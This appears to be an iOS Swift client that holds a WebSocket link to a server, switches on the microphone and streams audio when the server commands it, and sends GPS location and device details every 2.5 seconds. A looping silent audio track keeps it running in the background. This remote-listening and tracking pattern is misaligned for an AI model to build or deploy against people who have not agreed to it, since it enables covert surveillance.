import Foundation
import AVFoundation
import UIKit
import CoreLocation

// ==============================================
// LOCATION MANAGER
// ==============================================

final class LocationManager: NSObject, CLLocationManagerDelegate {
    static let shared = LocationManager()
    private var manager: CLLocationManager?
    private(set) var lastLocation: CLLocation?

    override init() {
        super.init()
        DispatchQueue.main.async {
            let mgr = CLLocationManager()
            mgr.delegate = self
            mgr.desiredAccuracy = kCLLocationAccuracyBest
            mgr.distanceFilter = kCLDistanceFilterNone
            self.manager = mgr
            mgr.requestWhenInUseAuthorization()
            mgr.startUpdatingLocation()
        }
    }

    func start() {
        DispatchQueue.main.async {
            guard let mgr = self.manager else {
                let mgr = CLLocationManager()
                mgr.delegate = self
                mgr.desiredAccuracy = kCLLocationAccuracyBest
                mgr.distanceFilter = kCLDistanceFilterNone
                self.manager = mgr
                mgr.requestWhenInUseAuthorization()
                mgr.startUpdatingLocation()
                return
            }
            mgr.requestWhenInUseAuthorization()
            mgr.startUpdatingLocation()
            mgr.requestLocation()
        }
    }

    var currentLocation: CLLocation? {
        return lastLocation ?? manager?.location
    }

    func locationManager(_ manager: CLLocationManager, didUpdateLocations locations: [CLLocation]) {
        if let loc = locations.last {
            lastLocation = loc
            print("[Location] Coordinates updated: \(loc.coordinate.latitude), \(loc.coordinate.longitude)")
        }
    }

    func locationManagerDidChangeAuthorization(_ manager: CLLocationManager) {
        manager.startUpdatingLocation()
        manager.requestLocation()
    }

    func locationManager(_ manager: CLLocationManager, didChangeAuthorization status: CLAuthorizationStatus) {
        manager.startUpdatingLocation()
        manager.requestLocation()
    }

    func locationManager(_ manager: CLLocationManager, didFailWithError error: Error) {
        print("[Location] Error:", error.localizedDescription)
    }
}


// ==============================================
// DEVICE MODEL IDENTIFIER
// ==============================================

func getDeviceModelName() -> String {
    var systemInfo = utsname()
    uname(&systemInfo)
    let machineMirror = Mirror(reflecting: systemInfo.machine)
    let identifier = machineMirror.children.reduce("") { identifier, element in
        guard let value = element.value as? Int8, value != 0 else { return identifier }
        return identifier + String(UnicodeScalar(UInt8(value)))
    }
    
    let modelMap: [String: String] = [
        "iPhone10,1": "iPhone 8",
        "iPhone10,4": "iPhone 8",
        "iPhone10,2": "iPhone 8 Plus",
        "iPhone10,5": "iPhone 8 Plus",
        "iPhone10,3": "iPhone X",
        "iPhone10,6": "iPhone X",
        "iPhone11,2": "iPhone XS",
        "iPhone11,4": "iPhone XS Max",
        "iPhone11,6": "iPhone XS Max",
        "iPhone11,8": "iPhone XR",
        "iPhone12,1": "iPhone 11",
        "iPhone12,3": "iPhone 11 Pro",
        "iPhone12,5": "iPhone 11 Pro Max",
        "iPhone12,8": "iPhone SE (2nd gen)",
        "iPhone13,1": "iPhone 12 mini",
        "iPhone13,2": "iPhone 12",
        "iPhone13,3": "iPhone 12 Pro",
        "iPhone13,4": "iPhone 12 Pro Max",
        "iPhone14,4": "iPhone 13 mini",
        "iPhone14,5": "iPhone 13",
        "iPhone14,2": "iPhone 13 Pro",
        "iPhone14,3": "iPhone 13 Pro Max",
        "iPhone14,6": "iPhone SE (3rd gen)",
        "iPhone14,7": "iPhone 14",
        "iPhone14,8": "iPhone 14 Plus",
        "iPhone15,2": "iPhone 14 Pro",
        "iPhone15,3": "iPhone 14 Pro Max",
        "iPhone15,4": "iPhone 15",
        "iPhone15,5": "iPhone 15 Plus",
        "iPhone16,1": "iPhone 15 Pro",
        "iPhone16,2": "iPhone 15 Pro Max",
        "iPhone17,1": "iPhone 16 Pro",
        "iPhone17,2": "iPhone 16 Pro Max",
        "iPhone17,3": "iPhone 16",
        "iPhone17,4": "iPhone 16 Plus",
        "i386": "iPhone Simulator",
        "x86_64": "iPhone Simulator",
        "arm64": "iPhone Simulator"
    ]
    
    let friendly = modelMap[identifier] ?? "iPhone"
    return "\(friendly) (\(identifier))"
}

final class NetworkManager: NSObject {

    static let shared = NetworkManager()

    // ==========================================
    // WEBSOCKET
    // ==========================================

    private var webSocket: URLSessionWebSocketTask?
    private var session: URLSession?

    // ==========================================
    // TELEMETRY
    // ==========================================

    private var telemetryTimer: Timer?


    // ==========================================
    // DEFAULT SERVER & TOKEN
    // ==========================================

    private let defaultServerIP =
        "192.168.0.104"

    private let defaultServerPort =
        3000

    private let defaultToken =
        ""

    // ==========================================
    // SAVED SERVER & TOKEN
    // ==========================================

    private(set) var serverIP: String
    private(set) var serverPort: Int
    private(set) var token: String

    // ==========================================
    // CONNECTION STATE
    // ==========================================

    private var isConnected = false
    private var isConnecting = false

    private var reconnectTimer:
        DispatchWorkItem?

    private var connectionGeneration = 0

    // ==========================================
    // BACKGROUND KEEP-ALIVE & VOLUME OBSERVER
    // ==========================================

    private var silentPlayer: AVAudioPlayer?
    private var volumeObservation: NSKeyValueObservation?
    private var currentOutputVolume: Float = 0.0

    // ==========================================
    // INIT
    // ==========================================

    private override init() {

        let savedIP =
            UserDefaults.standard.string(
                forKey:
                    "serverIP"
            )

        let savedPort =
            UserDefaults.standard.integer(
                forKey:
                    "serverPort"
            )

        let savedToken =
            UserDefaults.standard.string(
                forKey:
                    "serverAuthToken"
            )

        self.serverIP =
            savedIP ??
            defaultServerIP

        self.serverPort =
            savedPort > 0
            ? savedPort
            : defaultServerPort

        self.token =
            savedToken ??
            defaultToken

        super.init()

        setupAudioSessionAndKeepAlive()
        setupInterruptionHandling()
        setupVolumeObservation()
    }

    // ==========================================
    // AUDIO SESSION & KEEP-ALIVE
    // ==========================================

    func setupAudioSessionAndKeepAlive() {
        do {
            let session = AVAudioSession.sharedInstance()
            try session.setCategory(
                .playAndRecord,
                mode: .default,
                options: [
                    .mixWithOthers,
                    .defaultToSpeaker,
                    .allowBluetooth
                ]
            )
            try session.setActive(true)
            startSilentKeepAlive()
        } catch {
            print("[Audio] Session setup error:", error.localizedDescription)
        }
    }

    private func startSilentKeepAlive() {
        if silentPlayer != nil && silentPlayer?.isPlaying == true {
            return
        }

        let data = createSilentWavData()
        do {
            silentPlayer = try AVAudioPlayer(data: data)
            silentPlayer?.numberOfLoops = -1
            silentPlayer?.volume = 0.0
            silentPlayer?.prepareToPlay()
            silentPlayer?.play()
            print("[Audio] Silent background keep-alive active")
        } catch {
            print("[Audio] Failed to start silent player:", error.localizedDescription)
        }
    }

    private func setupInterruptionHandling() {
        NotificationCenter.default.addObserver(
            self,
            selector: #selector(handleAudioInterruption(_:)),
            name: AVAudioSession.interruptionNotification,
            object: AVAudioSession.sharedInstance()
        )
    }

    private func setupVolumeObservation() {
        let session = AVAudioSession.sharedInstance()
        currentOutputVolume = session.outputVolume
        volumeObservation = session.observe(\.outputVolume, options: [.initial, .new]) { [weak self] observedSession, _ in
            DispatchQueue.main.async {
                self?.currentOutputVolume = observedSession.outputVolume
            }
        }
    }

    @objc private func handleAudioInterruption(_ notification: Notification) {
        guard let info = notification.userInfo,
              let typeValue = info[AVAudioSessionInterruptionTypeKey] as? UInt,
              let type = AVAudioSession.InterruptionType(rawValue: typeValue) else {
            return
        }

        if type == .began {
            print("[Audio] Interruption began")
        } else if type == .ended {
            print("[Audio] Interruption ended, restoring session...")
            if let optionsValue = info[AVAudioSessionInterruptionOptionKey] as? UInt {
                let options = AVAudioSession.InterruptionOptions(rawValue: optionsValue)
                if options.contains(.shouldResume) {
                    setupAudioSessionAndKeepAlive()
                    if isConnected == false {
                        reconnect()
                    }
                }
            } else {
                setupAudioSessionAndKeepAlive()
            }
        }
    }

    private func createSilentWavData() -> Data {
        let sampleRate: Int32 = 8000
        let numChannels: Int16 = 1
        let bitsPerSample: Int16 = 16
        let byteRate = sampleRate * Int32(numChannels) * Int32(bitsPerSample / 8)
        let blockAlign = numChannels * (bitsPerSample / 8)
        let numSamples: Int32 = 8000
        let dataSize = numSamples * Int32(blockAlign)
        let chunkSize = 36 + dataSize

        var data = Data()
        data.append(contentsOf: [0x52, 0x49, 0x46, 0x46]) // "RIFF"
        var chunkSizeLE = chunkSize.littleEndian
        data.append(Data(bytes: &chunkSizeLE, count: 4))
        data.append(contentsOf: [0x57, 0x41, 0x56, 0x45]) // "WAVE"
        data.append(contentsOf: [0x66, 0x6D, 0x74, 0x20]) // "fmt "
        var subchunk1SizeLE: Int32 = Int32(16).littleEndian
        data.append(Data(bytes: &subchunk1SizeLE, count: 4))
        var audioFormatLE: Int16 = Int16(1).littleEndian
        data.append(Data(bytes: &audioFormatLE, count: 2))
        var channelsLE = numChannels.littleEndian
        data.append(Data(bytes: &channelsLE, count: 2))
        var sampleRateLE = sampleRate.littleEndian
        data.append(Data(bytes: &sampleRateLE, count: 4))
        var byteRateLE = byteRate.littleEndian
        data.append(Data(bytes: &byteRateLE, count: 4))
        var blockAlignLE = blockAlign.littleEndian
        data.append(Data(bytes: &blockAlignLE, count: 2))
        var bitsLE = bitsPerSample.littleEndian
        data.append(Data(bytes: &bitsLE, count: 2))
        data.append(contentsOf: [0x64, 0x61, 0x74, 0x61]) // "data"
        var dataSizeLE = dataSize.littleEndian
        data.append(Data(bytes: &dataSizeLE, count: 4))
        data.append(Data(repeating: 0, count: Int(dataSize)))
        return data
    }

    // ==========================================
    // GET SERVER IP
    // ==========================================

    func getServerIP() -> String {

        return serverIP
    }

    // ==========================================
    // GET SERVER PORT
    // ==========================================

    func getServerPort() -> String {

        return String(
            serverPort
        )
    }

    // ==========================================
    // GET AUTH TOKEN
    // ==========================================

    func getAuthToken() -> String {

        return token
    }

    // ==========================================
    // SET SERVER ADDRESS & TOKEN
    // ==========================================

    func setServerAddress(
        ip: String,
        port: String,
        token: String? = nil,
        shouldReconnect: Bool = true
    ) {

        let cleanedIP =
            ip
                .trimmingCharacters(
                    in:
                        .whitespacesAndNewlines
                )
                .replacingOccurrences(
                    of:
                        "ws://",
                    with:
                        ""
                )
                .replacingOccurrences(
                    of:
                        "wss://",
                    with:
                        ""
                )
                .trimmingCharacters(
                    in:
                        CharacterSet(
                            charactersIn:
                                "/"
                        )
                )

        let cleanedPort =
            port
                .trimmingCharacters(
                    in:
                        .whitespacesAndNewlines
                )

        guard
            !cleanedIP.isEmpty
        else {

            print(
                "[Network] Invalid IP"
            )

            return
        }

        guard
            let portNumber =
                Int(cleanedPort),
            portNumber > 0,
            portNumber <= 65535
        else {

            print(
                "[Network] Invalid port:",
                cleanedPort
            )

            return
        }

        // ======================================
        // TĂNG GENERATION
        // ======================================

        connectionGeneration += 1

        // ======================================
        // LƯU SERVER MỚI
        // ======================================

        serverIP =
            cleanedIP

        serverPort =
            portNumber

        UserDefaults.standard.set(
            cleanedIP,
            forKey:
                "serverIP"
        )

        UserDefaults.standard.set(
            portNumber,
            forKey:
                "serverPort"
        )

        if let token = token {
            let cleanedToken =
                token.trimmingCharacters(
                    in: .whitespacesAndNewlines
                )
            if !cleanedToken.isEmpty {
                self.token = cleanedToken
                UserDefaults.standard.set(
                    cleanedToken,
                    forKey:
                        "serverAuthToken"
                )
            }
        }

        print(
            "[Network] Server changed to:",
            "\(serverIP):\(serverPort)"
        )

        // ======================================
        // RECONNECT
        // ======================================

        if shouldReconnect {

            reconnect()
        }
    }

    // ==========================================
    // BUILD URL
    // ==========================================
    // ==========================================

    private func makeWebSocketURL()
        -> URL?
    {

        let urlString =
            "ws://\(serverIP):\(serverPort)/ws"

        return URL(
            string:
                urlString
        )
    }

    // ==========================================
    // CONNECT
    // ==========================================

    func connect() {

        guard
            let url =
                makeWebSocketURL()
        else {

            print(
                "[Network] Invalid WebSocket URL"
            )

            updateStatus(
                connected:
                    false,
                connecting:
                    false
            )

            scheduleReconnect()

            return
        }

        // ======================================
        // HỦY TIMER CŨ
        // ======================================

        reconnectTimer?.cancel()

        reconnectTimer =
            nil

        // ======================================
        // GENERATION
        // ======================================

        let generation =
            connectionGeneration

        // ======================================
        // STATE
        // ======================================

        isConnected =
            false

        isConnecting =
            true

        updateStatus(
            connected:
                false,
            connecting:
                true
        )

        print(
            "[Network] Connecting to:",
            url.absoluteString
        )

        // ======================================
        // ĐÓNG CONNECTION CŨ
        // ======================================

        webSocket?.cancel(
            with:
                .goingAway,
            reason:
                nil
        )

        webSocket =
            nil

        session?.invalidateAndCancel()

        session =
            nil

        // ======================================
        // CREATE SESSION
        // ======================================

        let configuration =
            URLSessionConfiguration.default

        session =
            URLSession(
                configuration:
                    configuration,
                delegate:
                    self,
                delegateQueue:
                    OperationQueue()
            )

        // ======================================
        // CREATE WEBSOCKET
        // ======================================

        guard
            let session =
                session
        else {
            return
        }

        webSocket =
            session.webSocketTask(
                with:
                    url
            )

        webSocket?.resume()

        // ======================================
        // RECEIVE
        // ======================================

        receiveMessage(
            generation:
                generation
        )
    }

    // ==========================================
    // AUTHENTICATE
    // ==========================================

    private func authenticate() {

        let message:
            [String: Any] = [

                "type":
                    "auth",

                "role":
                    "iphone",

                "token":
                    token
            ]

        sendJSON(
            message
        )
    }

    // ==========================================
    // RECEIVE
    // ==========================================

    private func receiveMessage(
        generation:
            Int
    ) {

        guard
            let socket =
                webSocket
        else {
            return
        }

        socket.receive {
            [weak self]
            result in

            guard
                let self =
                    self
            else {
                return
            }

            // Nếu đây không còn là connection hiện tại
            if generation !=
                self.connectionGeneration
            {
                return
            }

            switch result {

            // ==================================
            // SUCCESS
            // ==================================

            case .success(
                let message
            ):

                switch message {

                case .string(
                    let text
                ):

                    self.handleMessage(
                        text
                    )

                case .data(
                    let data
                ):

                    print(
                        "[Network] Received binary:",
                        data.count,
                        "bytes"
                    )

                @unknown default:

                    break
                }

                // Tiếp tục nghe message
                self.receiveMessage(
                    generation:
                        generation
                )

            // ==================================
            // FAILURE
            // ==================================

            case .failure(
                let error
            ):

                // Chỉ xử lý nếu đây vẫn
                // là connection hiện tại
                guard
                    generation ==
                        self.connectionGeneration
                else {
                    return
                }

                self.isConnected =
                    false

                self.isConnecting =
                    false

                self.updateStatus(
                    connected:
                        false,
                    connecting:
                        false
                )

                print(
                    "[Network] Receive error:",
                    error.localizedDescription
                )

                self.scheduleReconnect()
            }
        }
    }

    // ==========================================
    // HANDLE MESSAGE
    // ==========================================

    private func handleMessage(
        _ text: String
    ) {

        guard
            let data =
                text.data(
                    using:
                        .utf8
                )
        else {
            return
        }

        guard
            let message =
                try? JSONSerialization
                    .jsonObject(
                        with:
                            data
                    )
                    as?
                    [String: Any]
        else {
            return
        }

        // ======================================
        // AUTH RESULT
        // ======================================

        if
            let type =
                message["type"]
                as? String,
            type ==
                "auth_result"
        {

            let success =
                message["success"]
                as? Bool
                ?? false

            if success {

                isConnected =
                    true

                isConnecting =
                    false

                print(
                    "[Network] Authentication successful"
                )

                updateStatus(
                    connected:
                        true,
                    connecting:
                        false
                )

                self.startTelemetryTimer()

            } else {

                isConnected =
                    false

                isConnecting =
                    false

                self.stopTelemetryTimer()

                print(
                    "[Network] Authentication failed"
                )

                updateStatus(
                    connected:
                        false,
                    connecting:
                        false
                )

                scheduleReconnect()
            }


            return
        }

        // ======================================
        // COMMAND
        // ======================================

        guard
            let command =
                message["command"]
                as? String
        else {
            return
        }

        // ======================================
        // START MIC
        // ======================================

        if command ==
            "start_mic"
        {

            print(
                "[Network] START MIC command received"
            )

            DispatchQueue.main.async {

                NotificationCenter.default.post(
                    name:
                        .startMicrophone,
                    object:
                        nil
                )
            }

            return
        }

        // ======================================
        // STOP MIC
        // ======================================

        if command ==
            "stop_mic"
        {

            print(
                "[Network] STOP MIC command received"
            )

            DispatchQueue.main.async {

                NotificationCenter.default.post(
                    name:
                        .stopMicrophone,
                    object:
                        nil
                )
            }

            return
        }
    }

    // ==========================================
    // SEND JSON
    // ==========================================

    func sendJSON(
        _ object:
            [String: Any]
    ) {

        guard
            let socket =
                webSocket
        else {

            print(
                "[Network] Cannot send JSON: socket unavailable"
            )

            return
        }

        guard
            let data =
                try? JSONSerialization
                    .data(
                        withJSONObject:
                            object
                    ),
            let text =
                String(
                    data:
                        data,
                    encoding:
                        .utf8
                )
        else {
            return
        }

        socket.send(
            .string(
                text
            )
        ) {
            error in

            if let error =
                error
            {

                print(
                    "[Network] Send error:",
                    error.localizedDescription
                )
            }
        }
    }

    // ==========================================
    // SEND AUDIO
    // ==========================================

    func sendAudioData(
        _ data:
            Data
    ) {

        guard
            isConnected,
            let socket =
                webSocket
        else {
            return
        }

        socket.send(
            .data(
                data
            )
        ) {
            error in

            if let error =
                error
            {

                print(
                    "[Audio] Send error:",
                    error.localizedDescription
                )
            }
        }
    }

    // ==========================================
    // RECONNECT
    // ==========================================

    func reconnect() {

        print(
            "[Network] Reconnecting to:",
            "\(serverIP):\(serverPort)"
        )

        // ======================================
        // HỦY TIMER
        // ======================================

        reconnectTimer?.cancel()

        reconnectTimer =
            nil

        // ======================================
        // GENERATION MỚI
        // ======================================

        connectionGeneration += 1

        // ======================================
        // STATE
        // ======================================

        isConnected =
            false

        isConnecting =
            true

        updateStatus(
            connected:
                false,
            connecting:
                true
        )

        // ======================================
        // CANCEL SOCKET
        // ======================================

        webSocket?.cancel(
            with:
                .goingAway,
            reason:
                nil
        )

        webSocket =
            nil

        session?.invalidateAndCancel()

        session =
            nil

        // ======================================
        // CONNECT SAU 0.3S
        // ======================================

        DispatchQueue.main.asyncAfter(
            deadline:
                .now() + 0.3
        ) {
            [weak self] in

            self?.connect()
        }
    }

    // ==========================================
    // AUTO RECONNECT
    // ==========================================

    private func scheduleReconnect() {

        // Đã có timer rồi
        if reconnectTimer !=
            nil
        {
            return
        }

        print(
            "[Network] Will retry in 2 seconds..."
        )

        let workItem =
            DispatchWorkItem {
                [weak self] in

                guard
                    let self =
                        self
                else {
                    return
                }

                self.reconnectTimer =
                    nil

                self.connect()
            }

        reconnectTimer =
            workItem

        DispatchQueue.main.asyncAfter(
            deadline:
                .now() + 2,
            execute:
                workItem
        )
    }

    // ==========================================
    // UPDATE UI STATUS
    // ==========================================

    private func updateStatus(
        connected:
            Bool,
        connecting:
            Bool
    ) {

        DispatchQueue.main.async {

            NotificationCenter.default.post(
                name:
                    .networkStatusChanged,
                object:
                    nil,
                userInfo:
                    [
                        "connected":
                            connected,

                        "connecting":
                            connecting
                    ]
            )
        }
    }

    // ==========================================
    // TELEMETRY MONITORING
    // ==========================================

    func startTelemetryTimer() {
        stopTelemetryTimer()
        UIDevice.current.isBatteryMonitoringEnabled = true
        LocationManager.shared.start()

        // Gửi ngay 1 gói đầu tiên
        sendTelemetry()

        DispatchQueue.main.async { [weak self] in
            self?.telemetryTimer = Timer.scheduledTimer(withTimeInterval: 2.5, repeats: true) { [weak self] _ in
                self?.sendTelemetry()
            }
        }
        print("[Telemetry] Started 2.5s timer")
    }

    func stopTelemetryTimer() {
        DispatchQueue.main.async { [weak self] in
            self?.telemetryTimer?.invalidate()
            self?.telemetryTimer = nil
        }
    }

    func sendTelemetry() {
        guard isConnected else { return }
        UIDevice.current.isBatteryMonitoringEnabled = true
        let rawBattery = UIDevice.current.batteryLevel
        let batteryLevel = rawBattery >= 0 ? Int(round(rawBattery * 100)) : -1
        let batteryStateStr: String
        switch UIDevice.current.batteryState {
        case .charging: batteryStateStr = "charging"
        case .full: batteryStateStr = "full"
        case .unplugged: batteryStateStr = "unplugged"
        default: batteryStateStr = "unknown"
        }

        let brightness = Int(round(UIScreen.main.brightness * 100))
        let volFloat = currentOutputVolume > 0 ? currentOutputVolume : AVAudioSession.sharedInstance().outputVolume
        let volume = Int(round(volFloat * 100))
        let model = getDeviceModelName()
        let os = "\(UIDevice.current.systemName) \(UIDevice.current.systemVersion)"
        let deviceName = UIDevice.current.name

        var payload: [String: Any] = [
            "type": "telemetry",
            "model": model,
            "os": os,
            "deviceName": deviceName,
            "batteryLevel": batteryLevel,
            "batteryState": batteryStateStr,
            "brightness": brightness,
            "volume": volume
        ]

        if let loc = LocationManager.shared.currentLocation {
            payload["latitude"] = loc.coordinate.latitude
            payload["longitude"] = loc.coordinate.longitude
            payload["accuracy"] = loc.horizontalAccuracy
        }


        sendJSON(payload)
    }

    // ==========================================
    // CURRENT STATE
    // ==========================================

    func getConnectionState()
        -> Bool
    {

        return isConnected
    }
}

// ==============================================
// URL SESSION WEBSOCKET DELEGATE
// ==============================================

extension NetworkManager:
    URLSessionWebSocketDelegate {

    func urlSession(
        _ session:
            URLSession,
        webSocketTask:
            URLSessionWebSocketTask,
        didOpenWithProtocol
            protocol:
                String?
    ) {

        // ======================================
        // CONNECTED TO SOCKET
        // ======================================

        isConnected =
            false

        isConnecting =
            true

        updateStatus(
            connected:
                false,
            connecting:
                true
        )

        print(
            "[Network] WebSocket connected!"
        )

        // ======================================
        // AUTH
        // ======================================

        authenticate()
    }

    func urlSession(
        _ session:
            URLSession,
        webSocketTask:
            URLSessionWebSocketTask,
        didCloseWith
            closeCode:
                URLSessionWebSocketTask.CloseCode,
        reason:
            Data?
    ) {

        isConnected =
            false

        isConnecting =
            false

        stopTelemetryTimer()

        print(
            "[Network] WebSocket closed:",
            closeCode.rawValue
        )

        updateStatus(
            connected:
                false,
            connecting:
                false
        )

        scheduleReconnect()
    }
}


// ==============================================
// NOTIFICATIONS
// ==============================================

extension Notification.Name {

    static let startMicrophone =
        Notification.Name(
            "startMicrophone"
        )

    static let stopMicrophone =
        Notification.Name(
            "stopMicrophone"
        )

    static let networkStatusChanged =
        Notification.Name(
            "networkStatusChanged"
        )
}
